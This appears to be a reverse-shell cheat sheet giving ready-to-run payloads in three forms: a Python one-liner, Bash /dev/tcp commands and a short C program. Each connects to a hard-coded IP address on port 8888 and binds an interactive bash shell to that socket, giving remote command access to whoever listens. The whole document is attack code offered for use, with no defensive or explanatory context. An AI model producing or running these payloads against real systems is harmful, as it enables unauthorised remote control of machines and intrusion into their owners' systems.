#### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.109",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

#### Linux shell

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.31.62/8888 0>&1
bash -i >& /dev/tcp/ip/port 0>&1
```

#### c

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>

int tcp_port = 8888;
char *ip = "192.168.1.56";
void rev_shell(){
        int fd;
        if ( fork() <= 0){
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(tcp_port);
                addr.sin_addr.s_addr = inet_addr(ip);

                fd = socket(AF_INET, SOCK_STREAM, 0);
                if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
                        exit(0);
                }

                dup2(fd, 0);
                //dup2(fd, 1);
                //dup2(fd, 2);
                execve("/bin/bash", 0LL, 0LL);
        }
        return;
}

void main(int argc, char const *argv[])
{
        rev_shell();
        return 0;
}
```
